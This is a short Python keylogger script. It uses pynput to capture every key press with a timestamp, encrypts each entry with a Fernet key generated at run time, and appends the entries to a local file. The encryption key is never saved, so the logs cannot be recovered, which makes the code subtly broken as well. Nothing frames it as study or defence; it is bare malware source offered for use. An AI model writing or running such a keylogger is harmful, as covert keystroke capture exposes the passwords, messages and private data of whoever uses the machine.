from pynput import keyboard
import datetime
import os
from cryptography.fernet import Fernet

# Generate a key for encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)

def on_press(key):
    try:
        log_entry = f"{datetime.datetime.now()}: {key.char}\n"
    except AttributeError:
        log_entry = f"{datetime.datetime.now()}: {key}\n"

    encrypted_log_entry = cipher_suite.encrypt(log_entry.encode())
    with open("keylog_encrypted.txt", "ab") as f:
        f.write(encrypted_log_entry)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()